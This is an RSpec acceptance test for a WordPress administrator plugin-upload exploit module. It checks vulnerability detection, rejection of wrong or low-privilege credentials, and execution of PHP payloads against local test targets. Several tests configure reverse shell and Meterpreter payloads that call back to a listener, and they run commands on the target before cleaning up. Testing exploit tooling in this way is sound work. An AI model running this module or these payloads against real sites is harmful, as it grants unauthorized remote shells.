require 'acceptance_spec_helper'
require 'rbconfig'

RSpec.describe 'Native WordPress administrator upload targets' do
  include_context 'module target'
  include_context 'wait_for_expect'

  before(:all) do
    argv = [RbConfig.ruby, 'test/module_targets/wordpress_admin/native_probe.rb']
    stdout, stderr, status = Open3.capture3(*argv)
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-wordpress-admin.json'), stdout)
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-wordpress-admin-status.json'), JSON.pretty_generate(argv: argv, stderr: stderr, exitstatus: status.exitstatus))
    expect(status.success?).to be(true), stderr
    @native = JSON.parse(stdout)
    expect(@native.fetch('callbacks').size).to eq(3)
  end

  %w[root prefix].each do |service|
    it "recognizes the actual #{service} administrator's upload access" do
      expect(upload(service, {}, action: 'check')).to include('The target appears to be vulnerable')
    end

    {
      'wrong password' => { 'PASSWORD' => 'module-target-wrong-password' },
      'absent account' => { 'USERNAME' => 'module_target_missing' }
    }.each do |label, options|
      it "does not report #{service} upload access with #{label}" do
        output = upload(service, options, action: 'check')
        expect(output).not_to include('The target appears to be vulnerable', 'The target is vulnerable')
        expect(output).to match(/not vulnerable|authenticate|credentials|login/i)
      end
    end

    {
      'editor' => ['module_editor', 'module-target-&<café>'],
      'subscriber' => ['module_subscriber', 'module-target-subscriber-password']
    }.each do |role, (user, password)|
      it "does not report #{service} #{role} authentication alone as plugin-upload capability" do
        output = upload(service, { 'USERNAME' => user, 'PASSWORD' => password }, action: 'check')
        expect(output).not_to include('The target appears to be vulnerable', 'The target is vulnerable')
        expect(output).to match(/permission|upload|install|access|privilege/i)
      end
    end

    it "executes the #{service} non-session PHP payload twice with explicit operator cleanup" do
      2.times do
        original = artifact_state(service)
        path = '/tmp/module-target-wordpress-exec-proof'
        target_exec(service, 'test', '!', '-e', path)
        begin
          output = upload(service, {
            'PAYLOAD' => 'php/exec', 'CMD' => "/usr/bin/touch #{path}",
            'DisablePayloadHandler' => true, 'AllowNoCleanup' => true, 'WfsDelay' => 0
          })
          expect(output).to include('Executing the payload')
          wait_for_expect(10, 0.1) { expect(target_exec(service, 'stat', '-c', '%U', path).strip).to eq('www-data') }
          expect(artifact_state(service).fetch(:entries) - original.fetch(:entries)).to have_attributes(length: 1)
        ensure
          recover_owned_artifacts(service, original)
          target_exec(service, 'rm', '-f', path)
        end
        expect(artifact_state(service)).to eq(original)
      end
    end

    %w[php/reverse_php php/meterpreter/reverse_tcp php/meterpreter_reverse_tcp].each_with_index do |payload, index|
      it "opens #{payload} twice on #{service} and removes each uploaded plugin" do
        2.times do
          original = artifact_state(service)
          path = '/tmp/module-target-wordpress-session-proof'
          target_exec(service, 'test', '!', '-e', path)
          begin
            output = upload(service, {
              'PAYLOAD' => payload, 'LHOST' => listener_host, 'LPORT' => (service == 'prefix' ? 4454 : 4444) + index,
              'DisablePayloadHandler' => false, 'WfsDelay' => 10
            }, action: 'run -z')
            session_id = output[/(?:Command shell|Meterpreter) session (\d+) opened/, 1]
            expect(session_id).not_to be_nil, output
            meterpreter = payload.include?('meterpreter')
            command = meterpreter ? "execute -f /usr/bin/touch -a #{path}" : "/usr/bin/touch #{path}"
            proof = console_command("sessions -i #{session_id} #{meterpreter ? '-C' : '-c'} #{command.inspect}")
            expect(proof).not_to match(/\[-\]|Exception|Unknown command/)
            wait_for_expect(15, 0.2) { expect(target_exec(service, 'stat', '-c', '%U', path).strip).to eq('www-data') }
            wait_for_expect(15, 0.2) { expect(artifact_state(service)).to eq(original) }
          ensure
            console_command('sessions -K')
            console_command('jobs -K')
            recover_owned_artifacts(service, original)
            target_exec(service, 'rm', '-f', path)
          end
        end
      end
    end
  end

  it 'does not claim upload access when WordPress disables administrator file modifications' do
    output = upload('locked', {}, action: 'check')
    expect(output).not_to include('The target appears to be vulnerable', 'The target is vulnerable')
    expect(output).to match(/permission|upload|install|access|disabled/i)
  end

  it 'does not identify unrelated HTTP as an administrator upload target' do
    output = upload('unrelated', {}, action: 'check')
    expect(output).not_to include('The target appears to be vulnerable', 'The target is vulnerable')
  end

  [
    ['root', 'module_admin', 'module-target-wrong-password'],
    ['root', 'module_editor', 'module-target-&<café>'],
    ['root', 'module_subscriber', 'module-target-subscriber-password'],
    ['locked', 'module_admin', 'module-target-password'],
    ['unrelated', 'module_admin', 'module-target-password']
  ].each do |service, user, password|
    it "does not upload or execute with denied #{service}/#{user} credentials or permissions" do
      original = artifact_state(service) unless service == 'unrelated'
      output = upload(service, {
        'USERNAME' => user, 'PASSWORD' => password, 'PAYLOAD' => 'php/exec', 'CMD' => '/usr/bin/false',
        'DisablePayloadHandler' => true, 'AllowNoCleanup' => true, 'WfsDelay' => 0
      })
      expect(output).not_to include('Executing the payload', 'Uploaded plugin')
      expect(output).to match(/Failed to authenticate|Failed to acquire|Failed to upload|does not appear.*WordPress|permission|access/i)
      expect(artifact_state(service)).to eq(original) if original
    end
  end

  def upload(service, options = {}, action: 'run')
    defaults = {
      'SSL' => false, 'TARGETURI' => service == 'prefix' ? '/wordpress/' : '/',
      'USERNAME' => 'module_admin', 'PASSWORD' => 'module-target-password', 'HttpClientTimeout' => 10
    }
    output = run_target_module('exploit/unix/webapp/wp_admin_shell_upload', service, defaults.merge(options), action: action, allow_errors: true)
    output = output.dup.force_encoding(Encoding::UTF_8)
    expect(output.valid_encoding?).to be(true)
    output
  end

  def artifact_state(service)
    profile = @native.fetch('profiles').fetch(service)
    {
      entries: target_exec(service, 'find', profile.fetch('plugin_root'), '-mindepth', '1', '-maxdepth', '1', '-printf', '%f\n').lines.map(&:chomp).sort,
      archives: target_exec(service, 'find', "#{profile.fetch('install_root')}/wp-content", '-type', 'f', '-name', '*.zip', '-printf', '%P\n').lines.map(&:chomp).sort
    }
  end

  def recover_owned_artifacts(service, original)
    profile = @native.fetch('profiles').fetch(service)
    current = artifact_state(service)
    (current.fetch(:entries) - original.fetch(:entries)).each do |name|
      raise 'Unexpected recovery path' unless name.match?(/\A[a-zA-Z0-9_-]+\z/)

      target_exec(service, 'rm', '-rf', '--', "#{profile.fetch('plugin_root')}/#{name}")
    end
    (current.fetch(:archives) - original.fetch(:archives)).each do |name|
      raise 'Unexpected archive recovery path' if name.start_with?('/') || name.split('/').include?('..')

      target_exec(service, 'rm', '-f', '--', "#{profile.fetch('install_root')}/wp-content/#{name}")
    end
  end
end
